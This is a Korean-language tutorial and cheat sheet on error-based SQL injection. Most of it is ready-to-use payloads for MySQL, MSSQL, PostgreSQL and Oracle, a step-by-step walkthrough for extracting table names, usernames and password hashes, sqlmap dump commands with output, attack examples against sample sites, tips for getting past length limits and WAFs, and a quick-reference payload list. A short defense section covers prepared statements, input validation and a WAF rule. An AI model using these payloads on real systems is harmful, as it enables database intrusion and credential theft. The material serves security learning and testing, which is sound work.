Error-based SQL Injection

Error-based SQLi는 데이터베이스 에러 메시지를 통해 정보를 추출하는 In-band SQL Injection 기법입니다.

개념 (Concept)​

Error-based SQLi란?​

Error-based SQL Injection은 의도적으로 SQL 에러를 발생시켜, 에러 메시지에 포함된 데이터베이스 정보를 추출하는 기법입니다.

작동 원리:

  1. 악의적인 SQL 쿼리로 에러 유발
  2. DBMS가 에러 메시지에 쿼리 결과 포함
  3. 웹 페이지에 표시된 에러 메시지에서 정보 획득

공격 조건:

  • 데이터베이스 에러 메시지가 웹 페이지에 표시되어야 함
  • DBMS가 에러 메시지에 데이터를 포함할 수 있어야 함

장점 및 단점​

장점단점
빠른 데이터 추출에러 메시지 노출 필요
단일 요청으로 정보 획득추출 가능한 데이터 길이 제한
Union-based보다 간단최신 웹 앱에서는 에러 숨김

DBMS별 Error-based 기법​

MySQL​

1. ExtractValue 함수​

기본 구문:

AND extractvalue(1, concat(0x7e, (서브쿼리), 0x7e))

예시:

' AND extractvalue(1, concat(0x7e, database(), 0x7e))--

에러 메시지:

XPATH syntax error: '~testdb~'

2. UpdateXML 함수​

기본 구문:

AND updatexml(1, concat(0x7e, (서브쿼리), 0x7e), 1)

예시:

' AND updatexml(1, concat(0x7e, version(), 0x7e), 1)--

에러 메시지:

XPATH syntax error: '~5.7.31-0ubuntu0.18.04.1~'

3. FLOOR + RAND 함수​

기본 구문:

AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((서브쿼리), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)

예시:

' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(database(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)--

에러 메시지:

Duplicate entry 'testdb1' for key 'group_key'

MSSQL (Microsoft SQL Server)​

1. CONVERT 함수​

기본 구문:

AND 1=CONVERT(int, (서브쿼리))

예시:

' AND 1=CONVERT(int, @@version)--

에러 메시지:

Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2019' to data type int.

2. CAST 함수​

기본 구문:

AND 1=CAST((서브쿼리) AS int)

예시:

' AND 1=CAST((SELECT DB_NAME()) AS int)--

에러 메시지:

Conversion failed when converting the nvarchar value 'master' to data type int.

PostgreSQL​

1. CAST 타입 변환​

기본 구문:

AND 1=CAST((서브쿼리) AS numeric)

예시:

' AND 1=CAST(version() AS numeric)--

에러 메시지:

ERROR: invalid input syntax for type numeric: "PostgreSQL 12.5"

2. :: 연산자​

기본 구문:

AND 1=(서브쿼리)::int

예시:

' AND 1=(SELECT current_database())::int--

Oracle​

1. UTL_INADDR.GET_HOST_ADDRESS​

기본 구문:

AND 1=UTL_INADDR.GET_HOST_ADDRESS((서브쿼리))

예시:

' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))--

에러 메시지:

ORA-29257: host SYSTEM unknown

2. CTXSYS.DRITHSX.SN​

기본 구문:

AND 1=CTXSYS.DRITHSX.SN(1, (서브쿼리))

예시:

' AND 1=CTXSYS.DRITHSX.SN(1, (SELECT banner FROM v$version WHERE rownum=1))--

수동 공격 (Manual Exploitation)​

단계별 공격 시나리오​

1단계: 취약점 탐지​

특수문자 삽입:

http://example.com/product?id=1'

에러 확인:

You have an error in your SQL syntax

2단계: DBMS 식별​

MySQL 테스트:

' AND extractvalue(1, concat(0x7e, 'MySQL'))--

MSSQL 테스트:

' AND 1=CONVERT(int, 'MSSQL')--

PostgreSQL 테스트:

' AND 1=CAST('PostgreSQL' AS numeric)--

3단계: 데이터베이스 정보 수집​

현재 DB 이름 (MySQL):

' AND extractvalue(1, concat(0x7e, database(), 0x7e))--

현재 사용자 (MySQL):

' AND extractvalue(1, concat(0x7e, user(), 0x7e))--

DB 버전 (MySQL):

' AND extractvalue(1, concat(0x7e, version(), 0x7e))--

4단계: 테이블 이름 추출​

MySQL:

' AND extractvalue(1, concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e))--

여러 테이블 조회 (LIMIT 값 변경):

LIMIT 0,1  -- 첫 번째 테이블
LIMIT 1,1  -- 두 번째 테이블
LIMIT 2,1  -- 세 번째 테이블

5단계: 컬럼 이름 추출​

MySQL:

' AND extractvalue(1, concat(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1), 0x7e))--

6단계: 데이터 추출​

사용자 이름 추출 (MySQL):

' AND extractvalue(1, concat(0x7e, (SELECT username FROM users LIMIT 0,1), 0x7e))--

비밀번호 추출 (MySQL):

' AND extractvalue(1, concat(0x7e, (SELECT password FROM users LIMIT 0,1), 0x7e))--

여러 컬럼 동시 추출 (MySQL):

' AND extractvalue(1, concat(0x7e, (SELECT CONCAT(username, ':', password) FROM users LIMIT 0,1), 0x7e))--

출력 예시:

XPATH syntax error: '~admin:5f4dcc3b5aa765d61d8327deb882cf99~'

자동화 도구 (Automated Tools)​

SQLMap - Error-based 전용​

기본 Error-based 스캔​

sqlmap -u "http://example.com/product?id=1" --technique=E --batch

옵션 설명:

  • --technique=E: Error-based만 사용
  • --batch: 사용자 입력 없이 자동 진행

출력 예시:

[INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based' injectable
web application technology: PHP 7.4.3, Apache 2.4.41
back-end DBMS: MySQL >= 5.0

현재 데이터베이스 추출​

sqlmap -u "http://example.com/product?id=1" --technique=E --current-db

출력 예시:

current database: 'webapp_db'

테이블 열거​

sqlmap -u "http://example.com/product?id=1" --technique=E -D webapp_db --tables

출력 예시:

Database: webapp_db
[4 tables]
+----------+
| users    |
| products |
| orders   |
| sessions |
+----------+

특정 테이블 덤프​

sqlmap -u "http://example.com/product?id=1" --technique=E -D webapp_db -T users --dump

출력 예시:

Database: webapp_db
Table: users
[3 entries]
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
| 2  | user1    | 098f6bcd4621d373cade4e832627b4f6 |
| 3  | guest    | 084e0343a0486ff05530df6c705c8bb4 |
+----+----------+----------------------------------+

Verbose 모드로 페이로드 확인​

sqlmap -u "http://example.com/product?id=1" --technique=E -v 3

출력 예시 (사용된 페이로드 확인):

[INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[PAYLOAD] 1 AND (SELECT 7506 FROM(SELECT COUNT(*),CONCAT(0x7178766a71,(SELECT (ELT(7506=7506,1))),0x7176627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

기타 도구​

Burp Suite - Error-based 탐지​

Intruder 사용:

1. 요청 캡처
2. Intruder -> Positions에서 파라미터 선택
3. Payloads에 Error-based 페이로드 추가
4. Start Attack

페이로드 예시:

' AND extractvalue(1, concat(0x7e, database()))--
' AND updatexml(1, concat(0x7e, version()), 1)--
' AND 1=CONVERT(int, @@version)--

실전 공격 예시​

예시 1: 온라인 쇼핑몰​

취약한 URL:

http://shop.example.com/item.php?id=5

1. 취약점 확인:

http://shop.example.com/item.php?id=5'

에러:

You have an error in your SQL syntax near ''' at line 1

2. DB 버전 확인:

http://shop.example.com/item.php?id=5' AND extractvalue(1, concat(0x7e, version()))--

결과:

XPATH syntax error: '~5.7.31-0ubuntu0.18.04.1~'

3. 테이블 이름 추출:

http://shop.example.com/item.php?id=5' AND extractvalue(1, concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))--

결과:

XPATH syntax error: '~users~'

4. 관리자 계정 추출:

http://shop.example.com/item.php?id=5' AND extractvalue(1, concat(0x7e, (SELECT CONCAT(username, ':', password) FROM users WHERE id=1)))--

결과:

XPATH syntax error: '~admin:5f4dcc3b5aa765d61d8327deb882cf99~'

예시 2: 게시판 시스템​

취약한 URL:

http://board.example.com/view.php?no=10

MSSQL Error-based 공격:

http://board.example.com/view.php?no=10' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sys.databases))--

결과:

Conversion failed when converting the nvarchar value 'master' to data type int.

데이터 길이 제한 우회​

Error-based SQLi는 에러 메시지 길이 제한이 있습니다 (보통 32~64자).

해결 방법​

1. SUBSTRING 사용​

MySQL:

' AND extractvalue(1, concat(0x7e, SUBSTRING((SELECT password FROM users LIMIT 0,1), 1, 30)))--

위치 변경하여 나머지 추출:

SUBSTRING(..., 1, 30)   -- 1~30번째 문자
SUBSTRING(..., 31, 30)  -- 31~60번째 문자
SUBSTRING(..., 61, 30)  -- 61~90번째 문자

2. MID 함수​

MySQL:

' AND extractvalue(1, concat(0x7e, MID((SELECT GROUP_CONCAT(username) FROM users), 1, 30)))--

3. LIMIT과 OFFSET​

여러 행 순차 추출:

LIMIT 0,1  -- 첫 번째 행
LIMIT 1,1  -- 두 번째 행
LIMIT 2,1  -- 세 번째 행

방어 기법​

1. 에러 메시지 숨기기​

PHP (php.ini):

display_errors = Off
log_errors = On
error_log = /var/log/php_errors.log

ASP.NET (web.config):

<customErrors mode="On" defaultRedirect="error.html" />

2. Prepared Statements​

PHP (PDO):

$stmt = $pdo->prepare("SELECT * FROM products WHERE id = ?");
$stmt->execute([$id]);

Python (sqlite3):

cursor.execute("SELECT * FROM products WHERE id = ?", (id,))

3. 입력 검증​

PHP:

$id = filter_var($_GET['id'], FILTER_VALIDATE_INT);
if ($id === false) {
    http_response_code(400);
    die("Invalid input");
}

4. WAF 설정​

ModSecurity 규칙:

SecRule ARGS "@rx (extractvalue|updatexml|floor\(rand)" \
    "id:1001,phase:2,deny,status:403,msg:'Error-based SQLi attempt'"

트러블슈팅 체크리스트​

에러 메시지가 표시되지 않을 때​

  • 개발 환경인지 확인 (프로덕션은 에러 숨김)
  • User-Agent, Referer 등 헤더 변경 시도
  • 다른 파라미터에서 시도

페이로드가 작동하지 않을 때​

  • DBMS 종류 재확인 (MySQL, MSSQL, PostgreSQL 등)
  • URL 인코딩 필요 여부 확인
  • WAF 차단 여부 확인 (난독화 시도)
  • 쿼리 구조 재분석 (WHERE, ORDER BY, LIMIT 위치)

데이터가 잘릴 때​

  • SUBSTRING 또는 MID 함수로 분할 추출
  • LIMIT을 사용하여 행 단위로 추출
  • 컬럼을 개별적으로 추출

빠른 명령어 참조 (Quick Reference)​

MySQL​

# 기본 정보
' AND extractvalue(1, concat(0x7e, database()))--
' AND extractvalue(1, concat(0x7e, user()))--
' AND extractvalue(1, concat(0x7e, version()))--

# 테이블 이름
' AND extractvalue(1, concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))--

# 컬럼 이름
' AND extractvalue(1, concat(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)))--

# 데이터 추출
' AND extractvalue(1, concat(0x7e, (SELECT CONCAT(username, ':', password) FROM users LIMIT 0,1)))--

MSSQL​

# 기본 정보
' AND 1=CONVERT(int, @@version)--
' AND 1=CONVERT(int, DB_NAME())--
' AND 1=CONVERT(int, USER_NAME())--

# 테이블 이름
' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sys.tables))--

# 데이터 추출
' AND 1=CONVERT(int, (SELECT TOP 1 username FROM users))--

PostgreSQL​

# 기본 정보
' AND 1=CAST(version() AS numeric)--
' AND 1=CAST(current_database() AS numeric)--

# 테이블 이름
' AND 1=(SELECT table_name FROM information_schema.tables LIMIT 1)::int--
